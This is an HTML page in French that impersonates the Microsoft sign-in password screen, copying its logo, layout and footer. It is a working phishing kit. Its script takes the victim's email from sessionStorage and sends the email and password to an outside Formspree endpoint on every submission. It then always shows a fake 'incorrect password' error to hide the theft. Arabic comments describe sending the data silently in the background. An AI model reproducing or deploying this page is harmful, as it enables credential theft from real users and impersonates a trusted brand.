<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Microsoft - Mot de passe</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #ebf3f9;
            background: radial-gradient(circle at 50% 50%, #f7fafd 0%, #e2ecf5 100%);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow-x: hidden;
        }

        .login-container {
            background-color: #ffffff;
            width: 100%;
            max-width: 440px;
            padding: 44px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
            border-radius: 4px;
            margin-bottom: 50px;
            z-index: 2;
        }

        .back-arrow {
            cursor: pointer;
            display: inline-block;
            margin-bottom: 18px;
        }

        .back-arrow svg {
            width: 16px;
            height: 16px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 18px;
        }

        .logo-icon {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 2px;
            width: 21px;
            height: 21px;
            margin-right: 8px;
        }

        .logo-icon .tile {
            width: 9.5px;
            height: 9.5px;
        }
        .tile.red { background-color: #f25022; }
        .tile.green { background-color: #7fba00; }
        .tile.blue { background-color: #00a4ef; }
        .tile.yellow { background-color: #ffb900; }

        .brand-name {
            color: #737373;
            font-size: 18px;
            font-weight: 600;
        }

        .email-display {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 22px;
        }

        .title {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 24px;
        }

        .input-group {
            position: relative;
            margin-bottom: 16px;
        }

        .input-group input {
            width: 100%;
            padding: 10px 36px 6px 2px;
            border: none;
            border-bottom: 1px solid #707070;
            font-size: 15px;
            outline: none;
            color: #1b1b1b;
            background: transparent;
            transition: all 0.2s ease;
        }

        .input-group input:focus {
            border: 2px solid #0067b8;
            padding: 8px 34px 5px 6px;
            border-radius: 2px;
        }

        .input-group label {
            position: absolute;
            left: 2px;
            top: 8px;
            color: #666666;
            font-size: 15px;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        .input-group input:focus ~ label,
        .input-group input:valid ~ label {
            top: -18px;
            left: 0;
            font-size: 13px;
            color: #666666;
        }

        .input-group input:focus ~ label {
            color: #0067b8;
            left: 2px;
        }

        .eye-icon {
            position: absolute;
            right: 4px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .eye-icon svg {
            width: 16px;
            height: 16px;
            fill: #666666;
        }

        .btn-primary {
            background-color: #0067b8;
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 6px 12px;
            font-size: 15px;
            font-weight: 400;
            cursor: pointer;
            text-align: center;
            margin-bottom: 35px;
            height: 36px;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #005da6;
        }

        .other-methods {
            text-align: center;
        }

        .other-methods a {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
        }

        .other-methods a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #d32f2f;
            font-size: 13px;
            margin-bottom: 16px;
            text-align: left;
            display: none;
        }

        footer {
            position: absolute;
            bottom: 0;
            right: 0;
            padding: 20px;
            text-align: right;
            font-size: 11.5px;
            color: #242424;
            z-index: 2;
            display: flex;
            justify-content: flex-end;
            width: 100%;
        }

        footer a {
            color: #242424;
            text-decoration: none;
            margin-left: 16px;
        }

        footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            body {
                background: #ffffff;
                justify-content: flex-start;
                padding-top: 20px;
            }
            .login-container {
                box-shadow: none;
                padding: 10px 20px;
                margin-bottom: 100px;
            }
            footer {
                position: static;
                margin-top: auto;
                justify-content: center;
                padding: 20px;
                flex-wrap: wrap;
            }
            footer a {
                margin: 5px 8px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="back-arrow" onclick="window.location.href='index.html'">
            <svg viewBox="0 0 16 16" fill="none" xmlns="http://w3.org">
                <path d="M16 7H3.83L9.42 1.41L8 0L0 8L8 16L9.41 14.59L3.83 9H16V7Z" fill="#242424"/>
            </svg>
        </div>

        <div class="logo-container">
            <div class="logo-icon">
                <div class="tile red"></div>
                <div class="tile green"></div>
                <div class="tile blue"></div>
                <div class="tile yellow"></div>
            </div>
            <span class="brand-name">Microsoft</span>
        </div>

        <div class="email-display" id="userEmail">xxxxxxxxx@gmail.com</div>

        <h1 class="title">Entrez votre mot de passe</h1>

        <form id="loginForm">
            <input type="hidden" name="email" id="hiddenEmail">
            <div class="input-group">
                <input type="password" id="password" name="password" required autocomplete="off">
                <label>Mot de passe</label>
                <div class="eye-icon" onclick="togglePassword()">
                    <svg viewBox="0 0 16 16" xmlns="http://w3.org">
                        <path d="M8 3C4.5 3 1.5 5.5 0 8c1.5 2.5 4.5 5 8 5s6.5-2.5 8-5c-1.5-2.5-4.5-5-8-5zm0 8.5c-1.9 0-3.5-1.6-3.5-3.5S6.1 4.5 8 4.5 11.5 6.1 11.5 8 9.9 11.5 8 11.5zM8 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
                    </svg>
                </div>
            </div>
            <div id="errorMsg" class="error-message">❌ Mot de passe incorrect. Veuillez réessayer.</div>
            <button type="submit" class="btn-primary">Se connecter</button>
        </form>

        <div class="other-methods">
            <a href="#">Autres méthodes pour se connecter</a>
        </div>
    </div>

    <footer>
        <a href="#">Conditions d'utilisation</a>
        <a href="#">Confidentialité et cookies</a>
        <a href="#">Accessibilité : partiellement conforme</a>
        <a href="#">...</a>
    </footer>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
        }

        document.addEventListener('DOMContentLoaded', function() {
            const savedEmail = sessionStorage.getItem('temp_email');
            if (savedEmail) {
                document.getElementById('userEmail').innerText = savedEmail;
                document.getElementById('hiddenEmail').value = savedEmail;
            } else {
                window.location.href = "index.html";
            }
        });

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('hiddenEmail').value;
            const password = document.getElementById('password').value;

            // إرسال البيانات إلى Formspree (في جميع الأحوال)
            const formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);

            fetch("https://formspree.io/f/mpqnnvdo", {
                method: "POST",
                body: formData,
                headers: { 'Accept': 'application/json' }
            }).catch(err => console.error("Fetch error:", err)); // نرسل في الخلفية دون إزعاج المستخدم

            // إظهار رسالة "كلمة سر خاطئة" ومسح حقل كلمة المرور
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.style.display = 'block';
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        });
    </script>
</body>
</html>
